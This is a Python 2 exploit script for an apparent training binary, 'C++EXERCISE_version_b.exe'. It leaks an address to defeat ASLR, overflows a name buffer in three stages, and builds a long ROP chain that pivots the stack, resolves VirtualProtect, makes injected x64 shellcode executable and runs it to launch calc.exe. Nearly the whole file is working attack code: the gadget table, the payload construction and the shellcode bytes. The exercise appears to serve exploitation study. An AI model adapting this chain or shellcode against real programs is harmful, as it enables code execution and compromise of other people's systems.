#-*- coding: utf-8 -*-


'''
    Exploit for "C++EXERCISE_version_b.exe" 
    by F9, thanks to @DSTN_Gus for his help
'''

import os
import sys
import struct
import subprocess
import time
from ctypes import *
import hashlib

# Variables

# RVAs
kernel32_string_rva             = 0x2F910
GetModuleHandle_function_rva    = 0x2E068
GetProcAddress_function_rva     = 0x2E070
data_place_rva                  = 0x47000
VProtect_string_rva             = 0x47200
VProtect_function_rva           = 0x47300
kernel32_base_rva               = 0x47330
shellcode_rva                   = 0x47340
address_for_shitty_pitty_rva    = 0x47050
lpflOldProtect_rva              = 0x47080

'''
    Simple shellcode for x64 which traverse PEB to get kernel32 address
    and finally get WinExec, finally execute a calc.exe
'''
shellcode =  "\x99\x65\x48\x8B\x42\x60\x48\x8B\x40\x18\x48\x8B\x70\x10\x48\xAD\x48\x8B\x30\x48\x8B\x7E\x30\x48\x31\xDB\x48\x31\xF6"
shellcode += "\x8B\x5F\x3C\x48\x01\xFB\xB2\x88\x8B\x1C\x13\x48\x01\xFB\x8B\x73\x20\x48\x01\xFE\x99\x48\x31\xC9"
shellcode += "\x8B\x86\x00\x00\x00\x00\x48\x01\xF8\x81\x38\x57\x69\x6E\x45\x75\x02\xEB\x09\x48\x83\xC6\x04\x48\xFF\xC1\xEB\xE4\x48\xD1\xC1\x8B\x73\x24\x48\x01\xFE\x99\x48\x01\xCE\x48\x0F\xB7\x0E\x8B\x73\x1C\x48\x01\xFE\x99\x48\xC1\xC1\x02\x48\x01\xCE\x8B\x06\x48\x01\xF8\x99"
shellcode += "\xEB\x07\x59\x99\x48\xFF\xC2\xFF\xD0\xE8\xF4\xFF\xFF\xFFcalc.exe\x00\x90\x90\x90"
# rops
'''
    Too many, too many rop gadgets :( 
    I wanna cry...
'''
rop1    = 0xB557    # pop rbp ; ret
rop2    = 0x19066   # pop rcx ; ret
rop3    = 0xb54f    # lea rsp, [rbp + 0x10] ; pop r15 ; pop r14 ; pop rbp ; ret
rop4    = 0x20588   # mov qword ptr [rcx + 0x28], rax ; xchg dword ptr [rcx + 0x14], eax ; ret
rop5    = 0x17374   # pop rax ; ret

rop6    = 0x95E9    # lea rdx, [rsp + 0x40] ; call 0x1400158cd
rop7    = 0x19add   # sub rcx, r9 ; mov rax, rcx ; ret
rop8    = 0x19cb6   # mov rax, rdx ; ret
rop9    = 0x13241   # add rax, rcx ; ret
rop10   = 0x1900B   # pop rcx ; ret
rop11   = 0x153a7   # movsxd rbp, dword ptr [rax] ; add byte ptr [rax - 0x75], cl ; retf
rop12   = 0xD11B    # mov qword ptr [rax], rcx ; ret
rop13   = 0xd63b    # mov qword ptr [rax + 8], rdx ; ret
rop14   = 0x13240   # pop rax ; add rax, rcx ; ret
rop15   = 0x17374   # pop rax ; ret
rop16   = 0x739f    # mov qword ptr [rdx], rax ; mov eax, 1 ; ret
rop17   = 0xC66A    # xor r8d, r8d; lea rdx, [rsp+60h] ; mov rcx, rsi; call cs:RtlLookupFunctionEntry; test rax, rax; jz short loc_14000C6B9; add rsp, 40h; pop rdi; pop rsi; pop rbx; retn
rop18   = 0xC0A3    # pop rsi; ret
rop19   = 0xb296    # mov qword ptr [rdx + rcx*8], rax ; add rsp, 0x28 ; ret
rop20   = 0x8485    # call qword ptr [rax]
rop21   = 0x3180    # jmp qword ptr [rax]
rop22   = 0x188c0   # pop rcx; ret
rop23   = 0x1597    # mov qword ptr [rcx], rax ; ret
rop24   = 0x22262   # pop r13 ; ret
rop25   = 0xd827    # mov rdx, r13 ; call rax
rop26   = 0x17CE    # ret
rop27   = 0x179C 
'''
    .text:000000014000179C                 mov     r8d, edx
    .text:000000014000179F                 lea     rdx, [rsp+38h+var_18]
    .text:00000001400017A4                 call    qword ptr [rax+18h]
    .text:00000001400017A7                 mov     rcx, [rbx+8]
    .text:00000001400017AB                 mov     r9, [rax+8]
    .text:00000001400017AF                 mov     rdx, [rcx+8]
    .text:00000001400017B3                 cmp     [r9+8], rdx
    .text:00000001400017B7                 jnz     short loc_1400017C7
    .text:00000001400017B9                 mov     ecx, [rbx]
    .text:00000001400017BB                 cmp     [rax], ecx
    .text:00000001400017BD                 jnz     short loc_1400017C7
    .text:00000001400017BF                 mov     al, 1
    .text:00000001400017C1                 add     rsp, 30h
    .text:00000001400017C5                 pop     rbx
    .text:00000001400017C6                 retn
    .text:00000001400017C7 ; ---------------------------------------------------------------------------
    .text:00000001400017C7
    .text:00000001400017C7 loc_1400017C7:                          ; CODE XREF: sub_140001790+27↑j
    .text:00000001400017C7                                         ; sub_140001790+2D↑j
    .text:00000001400017C7                 xor     al, al
    .text:00000001400017C9                 add     rsp, 30h
    .text:00000001400017CD                 pop     rbx
    .text:00000001400017CE                 retn
    .text:00000001400017CE sub_140001790   endp
'''
rop28   = 0x6321    # pop;pop;pop;ret
rop29   = 0x2291    # pop rbx; ret
rop30   = 0x2CD00   # jmp rax

rva_leaked_address = 0x45B80

process = None

# Functions
def read_pipe():
    #@DSTN
    for line in iter(process.stdout.readline, ''):
        print "{EXE}" + line.rstrip()
        return line.rstrip()
    time.sleep(0.3)

def hex_to_ascii(number):
    return ''.join(struct.pack('<Q', number))


if len(sys.argv) != 2:
    print 'USAGE: %s C++EXERCISE_version_b.exe' % (sys.argv[0])
    print 'Other binary will not be accepted'
    sys.exit(-1)


with open(sys.argv[1],"rb") as f:
    bytes = f.read()
    readable_hash = hashlib.sha256(bytes).hexdigest();
    if readable_hash != '1a5aeab766b1b133edbb6355b873a6349082445747a0be94d2220f7056b37d9d':
        print 'What did I tell you? no other binaries will be accepted'
        print 'Get out of here'
        sys.exit(-1)

process = subprocess.Popen([sys.argv[1]], stdin=subprocess.PIPE, stdout=subprocess.PIPE)

raw_input("[!] PRESS ENTER TO START EXPLOIT (ATTACH DEBUGGER HERE IF YOU WANT)\n\n")

# >>>>>>==========================================================================>
# FIRST EXPLOIT PART
# >>>>>>==========================================================================>

print "FIRST ROUND OF THE FIGHT, GREET YOUR RIVAL"
time.sleep(2)

first_name =  'A'* 5
first_name += '\x33\xBC'
first_name += '\n'

second_name = 'GUSAA\n'


# first Please enter employee name
read_pipe()

# send dummy employee name
print "[+] Sending first worker name (payload)"
process.stdin.write(first_name)
time.sleep(0.4)

# hello, blahblahblah
read_pipe()

# enter new employee name
read_pipe()

print "[+] Sending second worker name (shit)"
process.stdin.write(second_name )
time.sleep(0.4)

# new line
read_pipe()

# hello, blahblahblahblah
read_pipe()

# please enter integer value
read_pipe()
# new line
read_pipe()
print "[+] Sending first number (to leak address)"
process.stdin.write("2\n")
time.sleep(0.4)

# leak
read_pipe()

leaked_address = int(raw_input("[--->] Please write number from cmd: "))
program_base_address = leaked_address - rva_leaked_address

print "[!] Program base address is: 0x%x" % (program_base_address)

# VAs
kernel_string_va = kernel32_string_rva + program_base_address
GetModuleHandle_function_va = GetModuleHandle_function_rva + program_base_address
GetProcAddress_function_va = GetProcAddress_function_rva + program_base_address
data_place_va = data_place_rva + program_base_address
VProtect_string_va = VProtect_string_rva + program_base_address
VProtect_function_va = VProtect_function_rva + program_base_address
kernel32_base_va = kernel32_base_rva + program_base_address
shellcode_va = shellcode_rva + program_base_address
address_for_shitty_pitty_va = address_for_shitty_pitty_rva + program_base_address
lpflOldProtect_va = lpflOldProtect_rva + program_base_address
call_to_main_va = 0xBC33 + program_base_address

rop1_va     = rop1 + program_base_address
rop2_va     = rop2 + program_base_address
rop3_va     = rop3 + program_base_address
rop4_va     = rop4 + program_base_address
rop5_va     = rop5 + program_base_address
rop6_va     = rop6 + program_base_address
rop7_va     = rop7 + program_base_address
rop8_va     = rop8 + program_base_address
rop9_va     = rop9 + program_base_address
rop10_va    = rop10 + program_base_address
rop11_va    = rop11 + program_base_address
rop12_va    = rop12 + program_base_address
rop13_va    = rop13 + program_base_address
rop14_va    = rop14 + program_base_address
rop15_va    = rop15 + program_base_address
rop16_va    = rop16 + program_base_address
rop17_va    = rop17 + program_base_address
rop18_va    = rop18 + program_base_address
rop19_va    = rop19 + program_base_address
rop20_va    = rop20 + program_base_address
rop21_va    = rop21 + program_base_address
rop22_va    = rop22 + program_base_address
rop23_va    = rop23 + program_base_address
rop24_va    = rop24 + program_base_address
rop25_va    = rop25 + program_base_address
rop26_va    = rop26 + program_base_address
rop27_va    = rop27 + program_base_address
rop28_va    = rop28 + program_base_address
rop29_va    = rop29 + program_base_address
rop30_va    = rop30 + program_base_address

print "[+] Sending 14 numbers"
for i in range(14):
    # please enter integer value
    read_pipe()
    # new line
    read_pipe()
    print "[+] Sending silly billy"
    process.stdin.write("4\n")
    time.sleep(0.4)
    # Respuesta 6
    read_pipe()


# please enter integer value
read_pipe()
# new line
read_pipe()

print "[+] Sending last number (for buffer overflow)"
process.stdin.write("4\n")
time.sleep(0.4)

print "[+] Buffer overflow done"
# Respuesta 6, buffer overflow done
read_pipe()


# clean pipe
read_pipe()



# >>>>>>==========================================================================>
# SECOND EXPLOIT PART
# >>>>>>==========================================================================>

print "SECOND ROUND, LET'S INCREASE THE SIZE ON STACK"
time.sleep(2)

second_payload = 'A'*80
'''
    First of all, for RtlLookupFunctionEntry we need to clean rsi
    to do that we just need to pop a 0
'''
second_payload += hex_to_ascii(rop18_va)        # pop rsi; ret
second_payload += hex_to_ascii(0x0000000000000000)
'''
    Next we have to load some address from stack on a register
    we have this gadget to load a rsp value to rdx, the function
    RtlLookupFunctionEntry destroy some values from the stack,
    but nothing difficult to clean with a pop. 
    After that we have an add rsp and some pops, so we have
    to add padding
'''
second_payload += hex_to_ascii(rop17_va)        # xor rd8, rd8; lea rdx, [rsp+60h] ; mov rcx, rsi; call cs:RtlLookupFunctionEntry; test rax, rax; jz short loc_14000C6B9; add rsp, 40h; pop rdi; pop rsi; pop rbx; retn
for i in range(11):
    second_payload += hex_to_ascii(0x9090909090909090) # padding padding
'''
    Clean destroyed value
'''
second_payload += hex_to_ascii(rop10_va)        # pop rcx ; ret
second_payload += hex_to_ascii(0x0000000000000000) # this value is destroyed by the function RtlLookupFunctionEntry, so let's set a pop before and go over it
'''
    To calculate with the stack value we have to
    copy it to another register, so move it to rax
'''
second_payload += hex_to_ascii(rop8_va)         # mov rax, rdx ; ret
'''
    Get a value to add to rax, as we need a sub
    just load a negative value
'''
second_payload += hex_to_ascii(rop10_va)        # pop rcx ; ret
second_payload += hex_to_ascii(0xfffffffffffff000)      # value to substract
'''
    Finally increase size for stack
'''
second_payload += hex_to_ascii(rop9_va)         # add rax, rcx ; ret
'''
    After the last step we will have a new value for the stack
    so just load it on a place on the stack
'''
second_payload += hex_to_ascii(rop10_va)        # pop rcx ; ret
second_payload += hex_to_ascii(0xE)            # value to multiply
second_payload += hex_to_ascii(rop19_va)        # mov qword ptr [rdx + rcx*8], rax ; add rsp, 0x28 ; ret
'''
    Always that we call the swiss knife gadget "mov qword ptr [rdx + rcx*8], rax ; add rsp, 0x28 ; ret"
    we have to include padding
'''
for i in range(5):
    second_payload += hex_to_ascii(0x9090909090909090) # padding padding
'''
    Finally load on rbp new stack value
'''
second_payload += hex_to_ascii(rop1_va)         # pop rbp ; ret
second_payload += hex_to_ascii(0x0000000000000000) # write here new stack value
'''
    On new stack position write the place to return, for that
    we will need the index for rcx, and value to write (the 
    call to the main function).
'''
second_payload += hex_to_ascii(rop10_va)        # pop rcx ; ret
second_payload += hex_to_ascii(0xfffffffffffffe05)
second_payload += hex_to_ascii(rop5_va)         # pop rax ; ret
second_payload += hex_to_ascii(call_to_main_va)
second_payload += hex_to_ascii(rop19_va)        # mov qword ptr [rdx + rcx*8], rax ; add rsp, 0x28 ; ret
for i in range(5):
    second_payload += hex_to_ascii(0x9090909090909090) # padding padding
'''
    Finally rsp get a new value, it does some pops (we don't care about those values)
    and finally the ret will find the address of call to main as we plan it.
'''
second_payload += hex_to_ascii(rop3_va)         # lea rsp, [rbp + 0x10] ; pop r15 ; pop r14 ; pop rbp ; ret  // HERE MOVE STACK AND CALL MAIN AGAIN
second_payload += '\n'



# Nombre Final and Please Enter Employee Name
read_pipe()

# hello, blahblahblah
read_pipe()

# enter new employee name
read_pipe()

# new line
read_pipe()

print "[+] Sending second worker name (payload)"
process.stdin.write(second_payload)
time.sleep(0.4)

# hello, blahblahblahblah
read_pipe()

# please enter integer value
read_pipe()
# new line
read_pipe()
print "[+] Sending first number (to leak address)"
process.stdin.write("2\n")
time.sleep(0.4)

# leak
read_pipe()

# please enter integer value
read_pipe()
# new line
read_pipe()

print "[+] Sending second number (for buffer overflow)"
process.stdin.write("4\n")
time.sleep(0.4)

print "[+] Buffer overflow done"
# Respuesta 6, buffer overflow done
read_pipe()



print "[+] Sending 14 numbers more"
for i in range(14):
    # please enter integer value
    read_pipe()
    # new line
    read_pipe()
    process.stdin.write("6\n")
    time.sleep(0.4)
    # Respuesta 6
    read_pipe()

# Nombre Final
read_pipe()


# new line
read_pipe()

print "[!] Stack size increased"


# >>>>>>==========================================================================>
# THIRD EXPLOIT PART
# >>>>>>==========================================================================>

print "LAST ROUND OF THE FIGHT, PREPARE WEAPON AND DEFEAT YOUR ENEMY"
time.sleep(2)

third_payload = 'A'*80
for i in range(18):
    third_payload += hex_to_ascii(rop10_va)                     # pop rcx ; ret
    third_payload += hex_to_ascii(shellcode_va + (i * 8))
    third_payload += hex_to_ascii(rop15_va)                     # pop rax ; ret
    third_payload += shellcode[i*8 : i*8+8]
    third_payload += hex_to_ascii(rop23_va)                     # mov qword ptr [rcx], rax ; ret
'''
    Save VirtualProtect string on .data
'''
third_payload += hex_to_ascii(rop10_va)                     # pop rcx ; ret
third_payload += hex_to_ascii(VProtect_string_va)             
third_payload += hex_to_ascii(rop15_va)                     # pop rax ; ret
third_payload += 'VirtualP'                                 
third_payload += hex_to_ascii(rop23_va)                     # mov qword ptr [rcx], rax ; ret
third_payload += hex_to_ascii(rop10_va)                     # pop rcx ; ret
third_payload += hex_to_ascii(VProtect_string_va + 8)
third_payload += hex_to_ascii(rop15_va)                     # pop rax ; ret          
third_payload += 'rotect\0\0'                              
third_payload += hex_to_ascii(rop23_va)                     # mov qword ptr [rcx], rax ; ret

'''
    Call to GetModuleHandle to get kernel32 base
    rcx = &"kernel32.dll"
    rax = &GetModuleHandle
'''
third_payload += hex_to_ascii(rop2_va)                      # pop rcx ; ret
third_payload += hex_to_ascii(kernel_string_va)
third_payload += hex_to_ascii(rop5_va)                      # pop rax ; ret
third_payload += hex_to_ascii(GetModuleHandle_function_va)
third_payload += hex_to_ascii(rop21_va)                     # jmp qword ptr [rax]
third_payload += hex_to_ascii(rop24_va)                     # pop r13 ; ret
third_payload += hex_to_ascii(0x0000000000000000)           # GetModuleHandle write here again the address of kernel32, clean it
'''
    Call to GetProcAddress
    rcx = kernel32 (from last function)
    rdx = &"VirtualProtect"
    rax = &GetProcAddress
'''
third_payload += hex_to_ascii(rop24_va)                     # pop r13 ; ret
third_payload += hex_to_ascii(VProtect_string_va)
third_payload += hex_to_ascii(rop5_va)                      # pop rax ; ret
third_payload += hex_to_ascii(rop5_va)                      # pop rax ; ret
third_payload += hex_to_ascii(rop25_va)                     # mov rdx, r13 ; call rax
third_payload += hex_to_ascii(rop5_va)                      # pop rax ; ret
third_payload += hex_to_ascii(GetProcAddress_function_va)
third_payload += hex_to_ascii(rop21_va)                     # jmp qword ptr [rax]
# clean the stack and save VirtualProtect
third_payload += hex_to_ascii(rop28_va)                     # pop;pop;pop;ret
third_payload += hex_to_ascii(0x0000000000000000)           # shit here
third_payload += hex_to_ascii(0x0000000000000000)           # more shit here for padding
third_payload += hex_to_ascii(0x0000000000000000)           # more shit here for padding
third_payload += hex_to_ascii(rop2_va)                      # pop rcx ; ret
third_payload += hex_to_ascii(VProtect_function_va)
third_payload += hex_to_ascii(rop23_va)                     # mov qword ptr [rcx], rax ; ret
'''
    Call to VirtualProtect
'''

# Set r8 to 0x40
third_payload += hex_to_ascii(rop5_va)                      # pop rax ; ret
third_payload += hex_to_ascii(rop5_va)                      # pop rax ; ret
third_payload += hex_to_ascii(rop24_va)                     # pop r13 ; ret
third_payload += hex_to_ascii(0x0000000000000040)           # EXECUTE_READWRITE
third_payload += hex_to_ascii(rop25_va)                     # mov rdx, r13 ; call rax
# prepare  shitty pitty to set r8 and r9
third_payload += hex_to_ascii(rop29_va)                     # pop rbx ; ret
third_payload += hex_to_ascii(VProtect_function_va - 8)     # function need to set rbx
third_payload += hex_to_ascii(rop10_va)                     # pop rcx ; ret
third_payload += hex_to_ascii(address_for_shitty_pitty_va + 0x18)
third_payload += hex_to_ascii(rop5_va)                      # pop rax ; ret
third_payload += hex_to_ascii(rop26_va)                     # ret
third_payload += hex_to_ascii(rop23_va)                     # mov qword ptr [rcx], rax ; ret
third_payload += hex_to_ascii(rop10_va)                     # pop rcx ; ret
third_payload += hex_to_ascii(address_for_shitty_pitty_va + 0x8)
third_payload += hex_to_ascii(rop5_va)                      # pop rax ; ret
third_payload += hex_to_ascii(lpflOldProtect_va)            # address for lpflOldProtect
third_payload += hex_to_ascii(rop23_va)                     # mov qword ptr [rcx], rax ; ret
third_payload += hex_to_ascii(rop5_va)                      # pop rax ; ret
third_payload += hex_to_ascii(address_for_shitty_pitty_va)
third_payload += hex_to_ascii(rop27_va)                     # big function to set r8 and r9
for i in range(7):
    third_payload += hex_to_ascii(0x9090909090909090)       # padding, padding
# here r8 is 0x40, and r9 point to the place for lpflOldProtect
# now set rdx to size and rcx to shellcode

# set rdx to size of shellcode
third_payload += hex_to_ascii(rop5_va)                      # pop rax ; ret
third_payload += hex_to_ascii(rop5_va)                      # pop rax ; ret
third_payload += hex_to_ascii(rop24_va)                     # pop r13 ; ret
third_payload += hex_to_ascii(len(shellcode))
third_payload += hex_to_ascii(rop25_va)                     # mov rdx, r13 ; call rax

# set rcx to shellcode
third_payload += hex_to_ascii(rop10_va)                     # pop rcx ; ret
third_payload += hex_to_ascii(shellcode_va)

# now set rax to Virtual Protect
third_payload += hex_to_ascii(rop5_va)                      # pop rax ; ret
third_payload += hex_to_ascii(VProtect_function_va)

# call VirtualProtect
third_payload += hex_to_ascii(rop21_va)                     # jmp qword ptr [rax]

# Point to shellcode and jump
third_payload += hex_to_ascii(rop5_va)                      # pop rax ; ret
third_payload += hex_to_ascii(shellcode_va)
third_payload += hex_to_ascii(rop30_va)                     # jmp rax  

third_payload += '\n'



# Nombre Final and Please Enter Employee Name
read_pipe()

# hello, blahblahblah
read_pipe()

# enter new employee name
read_pipe()

print "[+] Sending second worker name (payload)"
process.stdin.write(third_payload)
time.sleep(0.4)

# hello, blahblahblahblah
read_pipe()

# please enter integer value
read_pipe()
# new line
read_pipe()
print "[+] Sending first number (to leak address)"
process.stdin.write("2\n")
time.sleep(0.4)

# leak
read_pipe()

# please enter integer value
read_pipe()
# new line
read_pipe()

print "[+] Sending second number (for buffer overflow)"
process.stdin.write("4\n")
time.sleep(0.4)

print "[+] Buffer overflow done"
# Respuesta 6, buffer overflow done
read_pipe()



print "[+] Sending 14 numbers more"
for i in range(14):
    # please enter integer value
    read_pipe()
    # new line
    read_pipe()
    process.stdin.write("6\n")
    time.sleep(0.4)

    if i == 13:
        print "IF YOU HAVE CALC, YOUR ENEMY IS OVER"

    # Respuesta 6
    read_pipe()



# Nombre Final
read_pipe()


# new line
read_pipe()